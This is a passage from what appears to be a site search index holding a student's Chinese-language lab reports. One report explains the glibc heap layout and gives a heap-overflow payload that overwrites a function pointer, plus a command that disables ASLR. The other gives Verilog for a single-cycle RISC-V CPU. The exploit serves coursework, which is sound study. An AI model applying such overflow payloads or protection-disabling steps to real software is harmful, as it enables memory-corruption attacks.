header\uff09\u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u4e00\u5b9a\u662f 8 \u7684\u500d\u6570\uff08\u4e0d\u7136\u6269\u5230 8 \u7684\u500d\u6570\uff09\u56e0\u4e3a\u5927\u5c0f\u4e00\u5b9a\u662f 8 \u7684\u500d\u6570\uff0c\u6240\u4ee5\u6700\u540e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u53ef\u4ee5\u4e0d\u4e0e\u5927\u5c0f\u6709\u5173\uff08\u8bfb\u53d6\u5927\u5c0f\u65f6\u76f4\u63a5\u5c06\u540e\u4e09\u4e2a\u6bd4\u7279\u8bbe\u4e3a 0\uff09\uff0c\u56e0\u6b64\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u8868\u793a\u4ee5\u4e0b\u4e09\u4e2a\u6807\u5fd7\uff1a NON_MAIN_ARENA: \u5f53\u524d\u5806\u5757\u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1 \u4e0d\u5c5e\u4e8e\uff0c0 \u5c5e\u4e8e IS_MAPPED: \u5f53\u524d\u5806\u5757\u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\uff08\u5982\u679c\u7533\u8bf7\u7a7a\u95f4\u8fc7\u5927\u5219\u7531 mmap \u5206\u914d\uff09 PREV_INUSE: \u524d\u4e00\u4e2a\u5806\u5757\u662f\u5426\u88ab\u4f7f\u7528\uff0c\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5806\u5757\u8fd9\u91cc\u662f 1\uff0c\u540e\u9762\u7684\u5982\u679c\u524d\u4e00\u5806\u5757\u6b63\u5728\u4f7f\u7528\u5219\u662f 1\u3001\u88ab free \u4e86\u5219\u662f 0 user data: \u6570\u636e\u90e8\u5206\uff08\u5982\u679c\u5f53\u524d\u5806\u5757\u88ab free \u4e86\u5219\u4f1a\u4fdd\u5b58 fd bk fd_nextsize bk_nextsize \u4fe1\u606f\uff09 \u5982\u679c\u6ca1\u6709\u5f00\u542f ASLR\uff08\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\uff09\u5219\u4e24\u4e2a\u5806\u5757\u662f\u7d27\u6328\u7740\u7684\uff0c\u5982\u679c\u5f00\u542f\u4e86 ASLR \u5219\u4e24\u4e2a\u5806\u5757\u4e2d\u95f4\u6709\u968f\u673a\u5927\u5c0f\u7684\u95f4\u9694\u3002ASLR \u5728 Linux \u4e0a\u901a\u8fc7 echo 0 > /proc/sys/kernel/randomize_va_space \u6765\u5173\u95ed\uff08\u5728\u505a\u8fd9\u9898\u7684\u65f6\u5019\u9700\u8981\u5173\u95ed\uff09 \u5e76\u4e14\u6bcf\u4e2a\u5806\u5757\u4f1a\u5bf9\u9f50\u5230 0x10(16) \u7684\u6574\u6570\u500d\u5b57\u8282\uff0c\u5c11\u7684\u8bdd\u5219\u5728 user data \u540e\u9762\u8865\u5145\uff0c\u8fd9\u4e2a\u4e5f\u4f1a\u5f71\u54cd\u5230 size","title":"glibc \u5806\u7ed3\u6784"},{"location":"cs/system/cs1/lab4-2/#_9","text":"\u9898\u76ee\u7533\u8bf7\u4e86\u4e24\u4e2a\u5806\u5757\uff0c\u4e00\u4e2a\u662f 16 \u5b57\u8282\u5927\u5c0f\uff0c\u53e6\u4e00\u4e2a 8 \u5b57\u8282\u5927\u5c0f\uff0c\u5b83\u4eec\u7684 prev_size \u90fd\u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u53ef\u4ee5\u88ab\u586b\u5165\u4efb\u610f\u5185\u5bb9 16 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u5757\u52a0\u4e0a 8 \u5b57\u8282\u7684 prev_size \u548c size \u540e\u53d8\u6210 24 \u5b57\u8282\uff0c\u5bf9\u9f50\u5230 16 \u7684\u500d\u6570\u4e3a 32 \u5b57\u8282\uff0cNON_MAIN_ARENA \u4e3a 0\uff0cIS_MAPPED \u4e3a 0\uff0cPREV_INUSE \u4e3a 1\uff0c\u6240\u4ee5 size \u90e8\u5206\u4e3a 0b100001(0x21) 8 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u5757\u52a0\u4e0a 8 \u5b57\u8282 prev_size \u548c size \u540e\u53d8\u6210 16 \u5b57\u8282\uff0c\u6b63\u597d\u4e3a 16 \u6574\u6570\u500d\uff0c\u4e09\u4e2a\u6807\u5fd7\u540c\u6837\u4e3a 001\uff0c\u6240\u4ee5 size \u4e3a 0b10001(0x11) \u56e0\u6b64\u7b2c\u4e00\u4e2a\u5806\u5757\u7684 header \u4e0b\u6709 28 \u5b57\u8282\u7684\u7a7a\u95f4\uff0c\u7b2c\u4e8c\u4e2a\u5806\u5757\u7684 header \u4e0b\u6709 8 \u5b57\u8282\u7a7a\u95f4\uff0c\u4e14\u5df2\u7ecf\u586b\u5165\u4e24\u4e2a\u51fd\u6570\u5730\u5740","title":"\u5206\u6790\u9898\u4e2d\u7684\u5806"},{"location":"cs/system/cs1/lab4-2/#payload_1","text":"\u56e0\u4e3a prev_size \u662f\u7a7a\u95f2\u72b6\u6001\u53ef\u4ee5\u968f\u610f\u4f7f\u7528\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u6ea2\u51fa\u65f6\u7ed5\u8fc7\u7b2c\u4e8c\u4e2a\u5806\u5757\u7684 size \u5c31\u597d\u4e86\uff0c\u6574\u4e2a\u5806\u7684\u7ed3\u6784\u548c\u5229\u7528\u65b9\u5f0f\u5982\u4e0b\uff1a \u5373\u5148\u4f7f\u7528 28 \u4e2a\u4efb\u610f\u5b57\u7b26\u5360\u6ee1\u7b2c\u4e00\u4e2a\u5806\u7684 data \u548c\u7b2c\u4e8c\u4e2a\u5806\u7684 prev_size\uff0c\u518d\u8865\u4e0a\u7b2c\u4e8c\u4e2a\u5806\u7684 size\uff0c\u7136\u540e\u63a5\u60f3\u8981\u88ab\u8c03\u7528\u7684\u5730\u5740\uff08\u5373\u6211\u7684\u5b66\u53f7\u5bf9\u5e94\u7684 target \u5730\u5740 0x00010ddc\uff09\u3002\u6700\u540e\u9632\u6b62\u7b2c\u4e8c\u4e2a\u51fd\u6570\u6307\u9488\u88ab\u7834\u574f\u5bfc\u81f4\u5f02\u5e38\u9000\u51fa\uff0c\u518d\u8865\u4e0a\u4e00\u4e2a say_goodbye \u7684\u51fd\u6570\u5730\u5740 0x00010fbc\uff0c\u8fd9\u6837\u5b57\u7b26\u4e32\u7ed3\u5c3e\u7684 \"\\0\" \u5c31\u4f1a\u88ab\u653e\u5728\u8fd9\u4e2a\u5806\u5757\u7684\u5916\u9762\uff0c\u4e0d\u4f1a\u5bf9\u7a0b\u5e8f\u8fd0\u884c\u9020\u6210\u5f71\u54cd \u6240\u4ee5 payload \u5c31\u662f \"AAAAAAAAAAAAAAAAAAAAAAAAAAAA \\x11\\x00\\x00\\x00\\xdc\\x0d\\x01\\x00\\xbc\\x0f\\x01\\x00\"\uff08\u6ce8\u610f\u5c0f\u7aef\u5e8f\uff09","title":"\u6784\u9020 payload"},{"location":"cs/system/cs1/lab5-1/","text":"\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab5-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.05.20 ~ 2022.06.10\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 \u5b8c\u6210 32 \u4f4d\u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1 \u5b9e\u73b0 lw sw bne beq jal lui addi add slt slti \u6307\u4ee4 \u6839\u636e\u63d0\u4f9b\u7684\u6d4b\u8bd5\u6587\u4ef6\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5 \u6839\u636e\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u73ed\u9a8c\u8bc1 bonus\uff1a\u6307\u4ee4\u6269\u5c55 \u5b9e\u73b0 andi ori and or sll \u5b9e\u73b0 xori slli srli srl \u5b9e\u73b0 auipc sltu jalr \u6570\u636e\u901a\u8def\u8bbe\u8ba1 \u00b6 \u660e\u786e\u5df2\u7ed9\u4ee3\u7801 \u00b6 CPU \u76f8\u5173\u90e8\u5206 \u00b6 \u548c\u5355\u5468\u671f CPU \u672c\u8eab\u6709\u5173\u7684\u6838\u5fc3\u4ee3\u7801\u6709 Control.v \u00b6 \u901a\u8fc7 Control.edf \u4f7f\u7528\uff0c\u5728\u4eff\u771f\u65f6\u4f7f\u7528 Control_sim.v \u6587\u4ef6\u4e2d\u7684 Control\u3002\u529f\u80fd\u662f CPU \u7684\u63a7\u5236\u90e8\u5206\uff0c\u5176 Control \u6a21\u5757\u7684\u8f93\u5165\u8f93\u51fa\u90e8\u5206\uff1a input [ 6 : 0 ] op_code ; input [ 2 : 0 ] funct3 ; input funct7_5 ; output [ 1 : 0 ] pc_src ; output reg_write ; output alu_src_b ; output [ 3 : 0 ] alu_op ; output [ 1 : 0 ] mem_to_reg ; output mem_write ; output branch ; output b_type ; \u8f93\u5165\u4e3a RISC-V 32 \u4f4d\u6307\u4ee4\u7684\u4e09\u4e2a\u90e8\u5206\uff0cop_code \u4e3a\u4f4e 7 \u4f4d\u7684\u64cd\u4f5c\u7801\uff0cfunct3 \u4e3a inst[14:12] \u7684\u529f\u80fd\u90e8\u5206\uff0cfunct7_5 \u4e3a funct7 \u7684\u7b2c\u4e94\u4f4d\u4e5f\u5c31\u662f inst[30] \u8f93\u51fa\u4e3a\u8bd1\u7801\u5f97\u5230\u7684\u4e00\u4e9b\u7ed3\u679c\uff1a pc_src\uff1apc \u6765\u6e90\uff0c00 \u6765\u81ea pc+4\u300101 \u6765\u81ea JALR\u300110 \u6765\u81ea JAL reg_write\uff1a\u662f\u5426\u5199\u5165\u5bc4\u5b58\u5668\u7ec4 alu_src_b\uff1aALUsrc\uff0c0 \u8868\u793a ALU \u7684\u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u6765\u81ea\u5bc4\u5b58\u5668\uff0c1 \u8868\u793a\u6765\u81ea\u7acb\u5373\u6570 alu_op\uff1aALU \u8fdb\u884c\u7684\u64cd\u4f5c\u7b26\uff0c\u5728 AluOp.vh \u4e2d\u5b9a\u4e49 mem_to_reg\uff1a\u5199\u56de\u5bc4\u5b58\u5668\u7684\u6570\u636e\u6765\u6e90\uff0c00 \u5199\u56de\u6570\u636e\u6765\u81ea ALU\u300101 \u6765\u81ea\u7acb\u5373\u6570\u300110 \u6765\u81ea pc+4\u300111 \u6765\u81ea data memory mem_write\uff1a\u662f\u5426\u5199\u5165 data memory\uff0c0 \u8868\u793a\u8bfb\uff0c1 \u8868\u793a\u5199 branch\uff1a\u6307\u4ee4\u662f\u5426\u662f branch \u5206\u652f\u64cd\u4f5c\uff0c1 \u8868\u793a\u662f\uff0c0 \u4e0d\u662f b_type\uff1a\u5206\u652f\u64cd\u4f5c\u7c7b\u578b\uff0c0 \u8868\u793a bne\u30011 \u8868\u793a beq SCPU.v \u00b6 \u5355\u5468\u671f CPU \u7ed3\u6784\u6587\u4ef6\uff0c\u7528\u4e8e\u8fde\u63a5 CPU \u7684\u63a7\u5236\u90e8\u5206\u548c\u6570\u636e\u901a\u8def\u90e8\u5206\uff0cSCPU \u6a21\u5757\u8f93\u5165\u8f93\u51fa\u90e8\u5206\uff1a input clk , input rst , input [ 31 : 0 ] inst , input [ 31 : 0 ] data_in , // data from data memory input [ 4 : 0 ] debug_reg_addr , output [ 31 : 0 ] addr_out , // data memory address output [ 31 : 0 ] data_out , // data to data memory output [ 31 : 0 ] pc_out , // connect to instruction memory output mem_write , output [ 31 : 0 ] debug_reg \u8f93\u5165\u6709\u5355\u5468\u671f CPU \u65f6\u949f clk\uff0c\u590d\u4f4d\u4fe1\u53f7 rst\uff0c\u6307\u4ee4 inst\uff0c\u4ece data memory \u83b7\u53d6\u7684\u6570\u636e data_in\uff0c\u7528\u4e8e\u4e0a\u677f\u65f6 debug \u8f93\u51fa\u5bc4\u5b58\u5668\u503c\u7684\u5bc4\u5b58\u5668\u5730\u5740 debug_reg_addr\u3002 \u8f93\u51fa\u6709\u8981\u64cd\u4f5c data memory \u7684\u5730\u5740 addr_out\uff0c\u8981\u4f20\u7ed9 data memory \u7684\u6570\u636e data_out\uff0c\u63a5\u5165 instruction memory \u7684 pc \u6307\u9488\u503c pc_out\uff0c\u662f\u5426\u5199\u5165 data memory \u7684 mem_write\uff0c\u4ee5\u53ca\u5f97\u5230\u7684 debug \u8981\u663e\u793a\u7684\u5bc4\u5b58\u5668\u503c debug_reg\u3002 \u6a21\u5757\u4e2d\u95f4\u5c06 inst \u62c6\u5206\u8fde\u63a5\u5230\u4e86 Control \u6a21\u5757\uff0c\u518d\u5c06 Control \u6a21\u5757\u7684\u8f93\u51fa\u8fde\u63a5\u5230 Datapath \u7684\u8f93\u5165\uff0cDatapath \u7684\u8f93\u51fa\u4f5c\u4e3a SCPU \u7684\u8f93\u51fa\u3002 Core.v \u00b6 \u5c06 SCPU \u4e0e data memory\uff08ip \u6838\u4e2d\u7684 RAM\uff09\u548c instruction memory\uff08ip \u6838\u4e2d\u7684 ROM\uff09\u8fde\u63a5\uff0c\u5e76\u5904\u7406 SCPU \u7684\u65f6\u949f\u548c data memory \u7684\u65f6\u949f\uff0c\u518d\u63d0\u4f9b\u4e00\u4e9b\u7528\u4e8e debug \u7684\u8f93\u5165\u8f93\u51fa \u5176\u5b83\u6587\u4ef6 \u00b6 Top.\u200csv \u7528\u4e8e\u4e0a\u677f\u9a8c\u8bc1\u7684\u9876\u5c42\u6a21\u5757\uff0c\u5176\u4e2d\u5c06 Core \u8fde\u63a5\u5230\u4e86 IO_Manager \u4e2d\u6765\u4e3a FPGA \u677f\u5b50\u63d0\u4f9b\u8f93\u5165\u8f93\u51fa\u7684\u63a7\u5236\u3002 IO_Manager.sv \u4e3a FPGA \u677f\u5b50\u63d0\u4f9b\u8f93\u5165\u8f93\u51fa\u7684\u6a21\u5757\uff0c\u5176\u4e2d\u5904\u7406\u4e86\u5f00\u53d1\u7248\u4e0a\u7684\u6309\u952e\u3001\u5f00\u5173\uff0c\u4ee5\u53ca\u4e03\u6bb5\u7ba1\u7684\u8f93\u51fa\u3002 Core_tb.sv Core \u6a21\u5757\u7684 test bench\uff0c\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\u7684\u65f6\u5019\u5c06\u8fd9\u4e2a\u6587\u4ef6\u8bbe\u4e3a\u9700\u8981\u4eff\u771f\u7684\u6587\u4ef6\u3002 AluOp.vh \u91cc\u9762\u4e3a ALU \u8981\u8fdb\u884c\u7684\u8fd0\u7b97\u63d0\u4f9b\u4e86\u53d8\u91cf\u540d\uff0c\u5b9e\u73b0 ALU \u65f6\u8981\u6309\u7167\u91cc\u9762\u7684\u89c4\u5b9a\u6765\u6267\u884c\u8fd0\u7b97\u3002 \u660e\u786e\u76ee\u6807 \u00b6 \u5b8c\u6210\u6570\u636e\u901a\u8def\u8bbe\u8ba1\u7684\u76ee\u6807\u6709\u4ee5\u4e0b\u51e0\u4e2a\uff1a \u7f16\u5199 ALU \u6a21\u5757\uff0c\u5b8c\u6210 AluOp.vh \u6587\u4ef6\u4e2d\u89c4\u5b9a\u7684\u8fd0\u7b97 \u7f16\u5199\u5bc4\u5b58\u5668 Regs \u6a21\u5757\uff0c\u5b58\u50a8 31 \u4e2a 32 \u4f4d\u5bc4\u5b58\u5668\uff08\u7b2c 0 \u4e2a\u662f 0\uff09\uff0c\u5904\u7406\u5bc4\u5b58\u5668\u7684\u8bfb\u5199\u64cd\u4f5c \u7f16\u5199\u4e00\u4e9b Mux \u6a21\u5757\u7528\u4e8e\u6570\u636e\u901a\u8def\u4e2d\u7684\u591a\u8def\u9009\u62e9 \u7f16\u5199 ImmGen \u6a21\u5757\uff0c\u7528\u6765\u4ece\u6307\u4ee4\u4e2d\u89e3\u6790\u51fa\u7acb\u5373\u6570 \u7f16\u5199 Datapath \u6a21\u5757\uff0c\u8fde\u63a5\u8d77\u6570\u636e\u901a\u8def \u5728 SCPU \u6a21\u5757\u4e2d\u6b63\u786e\u8fde\u63a5 Control \u4e0e Datapath\uff08\u5df2\u7ecf\u505a\u597d\uff09 \u5728 Core \u6a21\u5757\u4e2d\u8fde\u63a5 SCPU \u4e0e RAM ROM \u6a21\u5757\u7f16\u5199\u4e0e\u8fde\u63a5 \u00b6 ALU \u00b6 \u8f93\u5165\u662f\u4e24\u4e2a 32 \u4f4d\u6570 a b \u548c\u8fdb\u884c\u7684\u64cd\u4f5c alu_op\uff0c\u8f93\u51fa\u662f\u7ed3\u679c\u548c zero \u6807\u5fd7\uff0ccase alu_op \u7136\u540e\u5206\u522b\u5b9e\u73b0\u5c31\u53ef\u4ee5\uff1a `timescale 1 ns / 1 ps module ALU ( input [ 31 : 0 ] a , input [ 31 : 0 ] b , input [ 3 : 0 ] alu_op , output reg [ 31 : 0 ] res , output zero ); `include \"AluOp.vh\" always @( * ) begin case ( alu_op ) ADD: res <= a + b ; SUB: res <= a - b ; SLL: res <= a << b ; SLT: begin if ( a [ 31 ] == 0 && b [ 31 ] == 1 ) res <= 0 ; else if ( a [ 31 ] == 1 && b [ 31 ] == 0 ) res <= 1 ; else if ( a [ 31 ] == b [ 31 ]) begin if ( a [ 30 : 0 ] < b [ 30 : 0 ]) res <= 1 ; else res <= 0 ; end end SLTU: begin if ( a < b ) res <= 1 ; else res <= 0 ; end XOR: res <= a ^ b ; SRL: res <= a >> b ; SRA: res <= a >>> b ; OR: res <= a | b ; AND: res <= a & b ; default : res = 0 ; endcase end assign zero = ( a - b ) ? 1 'b0 : 1 'b1 ; endmodule \u5bc4\u5b58\u5668 Regs \u00b6 \u5728 lab \u7684 pdf \u6587\u4ef6\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u5bc4\u5b58\u5668\u7ec4\u90e8\u5206\u7684\u8bbe\u8ba1\uff0c\u53ea\u9700\u8981\u6dfb\u52a0\u4e00\u4e0b\u5bf9\u4e8e debug_reg_addr \u548c debug_reg \u7684\u8f93\u5165\u8f93\u51fa\u5373\u53ef\uff1a `timescale 1 ns / 1 ps module Regs ( input clk , input rst , input we , input [ 4 : 0 ] read_addr_1 , input [ 4 : 0 ] read_addr_2 , input [ 4 : 0 ] write_addr , input [ 31 : 0 ] write_data , input [ 4 : 0 ] debug_reg_addr , output [ 31 : 0 ] read_data_1 , output [ 31 : 0 ] read_data_2 , output [ 31 : 0 ] debug_reg ); integer i ; reg [ 31 : 0 ] register [ 1 : 31 ]; // x1 - x31, x0 keeps zero assign read_data_1 = ( read_addr_1 == 0 ) ? 0 : register [ read_addr_1 ]; // read assign read_data_2 = ( read_addr_2 == 0 ) ? 0 : register [ read_addr_2 ]; // read assign debug_reg = ( debug_reg_addr == 0 ) ? 0 : register [ debug_reg_addr ]; always @( posedge clk or posedge rst ) begin if ( rst == 1 ) for ( i = 1 ; i < 32 ; i = i + 1 ) register [ i ] <= 0 ; // reset else if ( we == 1 && write_addr != 0 ) register [ write_addr ] <= write_data ; end endmodule \u591a\u8def\u9009\u62e9\u5668 Mux \u00b6 \u9996\u5148\u5b9e\u73b0\u666e\u901a\u7684 32 \u4f4d 2 \u8def\u9009\u62e9\u5668 Mux2x32 \u548c 32 \u4f4d 4 \u8def\u9009\u62e9\u5668 Mux4x32\uff1a `timescale 1 ns / 1 ps module Mux2x32 ( input [ 31 : 0 ] I0 , input [ 31 : 0 ] I1 , input s , output [ 31 : 0 ] o ); assign o = s ? I1 : I0 ; endmodule module Mux4x32 ( input [ 31 : 0 ] I0 , input [ 31 : 0 ] I1 , input [ 31 : 0 ] I2 , input [ 31 : 0 ] I3 , input [ 1 : 0 ] s , output [ 31 : 0 ] o ); reg [ 31 : 0 ] out ; always @( * ) begin case ( s ) 2 'b00 : out <= I0 ; 2 'b01 : out <= I1 ; 2 'b10 : out <= I2 ; 2 'b11 : out <= I3 ; endcase end assign o = out ; endmodule \u7136\u540e\u518d\u5b9e\u73b0\u4e00\u4e2a\u7528\u4e8e\u5904\u7406\u6700\u540e PC \u7ed3\u679c\u7684\u7279\u6b8a\u9009\u62e9\u5668\uff08\u5373\u9700\u8981\u5224\u65ad\u4e00\u4e0b\u662f\u5426\u6709\u5206\u652f\u4ee5\u53ca\u5206\u652f\u662f\u5426\u6210\u7acb\uff09\uff1a module MuxPC ( input [ 31 : 0 ] I0 , // pc+4 input [ 31 : 0 ] I1 , // JALR \u7684\u5730\u5740 input [ 31 : 0 ] I2 , // JAL \u7684\u5730\u5740 input [ 31 : 0 ] I3 , // branch \u7684\u5730\u5740 input [ 1 : 0 ] s , // pc_src input branch , // \u662f\u5426\u5206\u652f input b_type , // 0 bne, 1 beq input [ 31 : 0 ] alu_res , // alu \u7684\u7ed3\u679c\uff0c\u7528\u6765\u5224\u65ad\u5206\u652f\u662f\u5426\u6210\u7acb output [ 31 : 0 ] o // \u7ed3\u679c\u7684 pc ); reg [ 31 : 0 ] out ; always @( * ) begin if ( branch ) begin // \u6709\u5206\u652f\u64cd\u4f5c if ( b_type ) begin // beq if ( alu_res == 32 'b0 ) out <= I3 ; // \u5206\u652f else out <= I0 ; end else begin // bne if ( alu_res == 32 'b0 ) out <= I0 ; else out <= I3 ; // \u5206\u652f end end else begin case ( s ) 2 'b00 : out <= I0 ; 2 'b01 : out <= I1 ; 2 'b10 : out <= I2 ; 2 'b11 : out <= I3 ; endcase end end assign o = out ; endmodule \u89e3\u6790\u7acb\u5373\u6570 ImmGen \u00b6 \u5148\u901a\u8fc7\u4e00\u4e2a Opcodes.vh \u6587\u4ef6\u5b9a\u4e49\u4e00\u4e9b\u8981\u7528\u7684\u6307\u4ee4\u540d\u548c opcode \u7684\u5bf9\u5e94\u4ee5\u53ca\u6307\u4ee4\u7c7b\u578b\u7684\u679a\u4e3e\uff1a //`ifndef OPCODES_H //`define OPCODES_H parameter LW = 7 'b0000011 , SW = 7 'b0100011 , ADDI = 7 'b0010011 , BNE = 7 'b1100011 , BEQ = 7 'b1100011 , JAL = 7 'b1101111 , LUI = 7 'b0110111 , ADD = 7 'b0110011 , SLT = 7 'b0110011 , SLTI = 7 'b0010011 , ANDI = 7 'b0010011 , ORI = 7 'b0010011 , AND = 7 'b0110011 , OR = 7 'b0110011 , SLL = 7 'b0110011 , XORI = 7 'b0010011 , SLLI = 7 'b0010011 , SRLI = 7 'b0010011 , SRL = 7 'b0110011 , AUIPC = 7 'b0010111 , SLTU = 7 'b0110011 , JALR = 7 'b1100111 ; parameter R = 3 'b000 , I = 3 'b001 , S = 3 'b010 , B = 3 'b011 , U = 3 'b100 , J = 3 'b101 ; //`endif \u7136\u540e\u518d\u7f16\u5199\u4e00\u4e2a ImmGen \u6a21\u5757\u6765\u8bc6\u522b opcode\u3001\u5206\u7c7b\u6307\u4ee4\u3001\u83b7\u53d6\u7acb\u5373\u6570\uff0c\u5bf9\u4e8e\u51e0\u79cd\u6307\u4ee4\uff0c\u83b7\u53d6\u7684\u7acb\u5373\u6570\u5206\u522b\u662f\uff1a R \u578b\uff1a20 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31:20] I \u578b\uff1a\u540c R \u578b S \u578b\uff1a20 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31:25] + inst[11:7] B \u578b\uff1a19 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31] + inst[7] + inst[30:25] + inst[11:8]\uff0c\u6700\u540e\u4e00\u4f4d\u8865 0\uff08\u76f8\u5f53\u4e8e\u9884\u5148\u8fdb\u884c\u4e86\u5206\u652f\u65f6\u7684 imm << 1 \u64cd\u4f5c\uff09 U \u578b\uff1ainst[31:12] \u540e\u9762\u8865 12 \u4e2a 0 J \u578b\uff1a11 \u4e2a\u4e0e inst[31] \u76f8\u540c\u7684\u7b26\u53f7\u4f4d\u6269\u5c55\u6bd4\u7279\u548c inst[31] + inst[19:12] + inst[20] + inst[30:21]\uff0c\u6700\u540e\u4e00\u4f4d\u8865 0 \u6839\u636e\u8fd9\u4e9b\u89c4\u5219\u4ee5\u53ca\u6307\u4ee4\u548c\u7c7b\u578b\u7684\u5bf9\u5e94\u53ef\u4ee5\u5199\u51fa ImmGen \u7c7b\uff1a `timescale 1 ns / 1 ps module ImmGen ( input [ 31 : 0 ] inst , output [ 31 : 0 ] imm ); `include \"Opcodes.vh\" reg [ 3 : 0 ] type ; reg [ 31 : 0 ] out ; assign imm = out ; always @( * ) begin case ( inst [ 6 : 0 ]) LW: type <= I ; SW: type <= S ; ADDI: type <= I ; BNE: type <= B ; BEQ: type <= B ; JAL: type <= J ; LUI: type <= U ; ADD: type <= R ; SLT: type <= R ; SLTI: type <= I ; ANDI: type <= I ; ORI: type <= I ; AND: type <= R ; OR: type <= R ; SLL: type <= R ; XORI: type <= I ; SLLI: type <= R ; SRLI: type <= R ; SRL: type <= R ; AUIPC: type <= U ; SLTU: type <= R ; JALR: type <= I ; endcase case ( type ) R: out <= {{ 20 { inst [ 31 ]}}, inst [ 31 : 20 ]}; I: out <= {{ 20 { inst [ 31 ]}}, inst [ 31 : 20 ]}; S: out <= {{ 20 { inst [ 31 ]}}, inst [ 31 : 25 ], inst [ 11 : 7 ]}; B: out <= {{ 19 { inst [ 31 ]}}, inst [ 31 ], inst [ 7 ], inst [ 30 : 25 ], inst [ 11 : 8 ], 1 'b0 }; U: out <= { inst [ 31 : 12 ], 12 'b0 }; J: out <= {{ 11 { inst [ 31 ]}}, inst [ 31 ], inst [ 19 : 12 ], inst [ 20 ], inst [ 30 : 21 ], 1 'b0 }; endcase end endmodule \u6570\u636e\u901a\u8def Datapath \u00b6 \u6839\u636e\u524d\u9762\u5199\u597d\u7684\u6a21\u5757\u4ee5\u53ca\u5206\u6790\uff0c\u8fd8\u6709 pdf \u7ed9\u51fa\u7684\u6570\u636e\u901a\u8def\u8bbe\u8ba1\u56fe\u5c31\u53ef\u4ee5\u5199\u51fa\u6570\u636e\u901a\u8def\u90e8\u5206\u7684\u4ee3\u7801\uff1a `timescale 1 ns / 1 ps module Datapath ( input clk , input rst , input [ 1 : 0 ] pc_src , // pc \u6765\u6e90 input reg_write , // \u662f\u5426\u5199\u5165\u5bc4\u5b58\u5668 input alu_src_b , // ALUsrc input branch , // \u662f\u5426\u4e3a branch \u7c7b\u578b\u7684\u6307\u4ee4 input b_type , // branch \u7c7b\u578b input [ 3 : 0 ] alu_op , // ALU operation input [ 1 : 0 ] mem_to_reg , // MemtoReg input [ 31 : 0 ] inst_in , // \u5f53\u524d\u6307\u4ee4 input [ 31 : 0 ] data_in , // data from data memory output [ 31 : 0 ] addr_out , // data memory address output [ 31 : 0 ] data_out , // data to data memory output [ 31 : 0 ] pc_out , // connect to instruction memory input [ 4 : 0 ] debug_reg_addr , output [ 31 : 0 ] debug_reg ); reg [ 31 : 0 ] pc ; wire [ 31 : 0 ] pc_next ; wire [ 31 : 0 ] write_data , read_data_1 , read_data_2 ; wire [ 31 : 0 ] mux_out_1 , alu_result ; wire alu_zero ; wire [ 31 : 0 ] imm ; wire [ 31 : 0 ] jmp_addr ; assign pc_out = pc ; assign addr_out = alu_result ; assign data_out = read_data_2 ; always @( posedge clk or posedge rst ) begin if ( rst ) begin pc <= 32 'b0 ; // \u5bf9 pc \u590d\u4f4d end else begin pc <= pc_next ; // \u8bbe\u7f6e pc \u7684\u65b0\u503c end end Regs regs ( // \u8fde\u63a5\u5bc4\u5b58\u5668\u7ec4 . clk ( clk ), . rst ( rst ), . we ( reg_write ), . read_addr_1 ( inst_in [ 19 : 15 ]), . read_addr_2 ( inst_in [ 24 : 20 ]), . write_addr ( inst_in [ 11 : 7 ]), . write_data ( write_data ), . read_data_1 ( read_data_1 ), . read_data_2 ( read_data_2 ), . debug_reg_addr ( debug_reg_addr ), . debug_reg ( debug_reg ) ); ImmGen immgen ( // \u8fde\u63a5 ImmGen\uff0c\u4ece inst_in \u4e2d\u83b7\u5f97\u7acb\u5373\u6570 imm . inst ( inst_in ), . imm ( imm ) ); Mux2x32 mux2x32 ( // \u9009\u62e9 ALU \u7b2c\u4e8c\u4e2a\u8f93\u5165 . I0 ( read_data_2 ), . I1 ( imm ), . s ( alu_src_b ), . o ( mux_out_1 ) ); ALU alu ( // \u8fdb\u884c ALU \u8fd0\u7b97\uff0c\u7b2c\u4e00\u4e2a\u8f93\u5165\u662f\u5bc4\u5b58\u5668\uff0c\u7b2c\u4e8c\u4e2a\u662f\u9009\u62e9\u5668\u7684\u7ed3\u679c . a ( read_data_1 ), . b ( mux_out_1 ), . alu_op ( alu_op ), . res ( alu_result ), . zero ( alu_zero ) ); Mux4x32 mux4x32 ( // \u9009\u62e9\u5199\u5165 data memory \u7684\u6570\u636e . I0 ( alu_result ), . I1 ( imm ), . I2 ( pc + 4 ), . I3 ( data_in ), . s ( mem_to_reg ), . o ( write_data ) ); assign jmp_addr = pc + imm ; // \u5f97\u5230\u8df3\u8f6c\u6307\u4ee4\u7684\u8df3\u8f6c\u76ee\u6807 MuxPC mux_pc ( // \u9009\u62e9 pc \u7684\u65b0\u503c . I0 ( pc + 4 ), // \u76f4\u63a5\u52a0 4 . I1 ( jmp_addr ), // JALR \u8df3\u8f6c\u5730\u5740 . I2 ( jmp_addr ), // JAL \u8df3\u8f6c\u5730\u5740 . I3 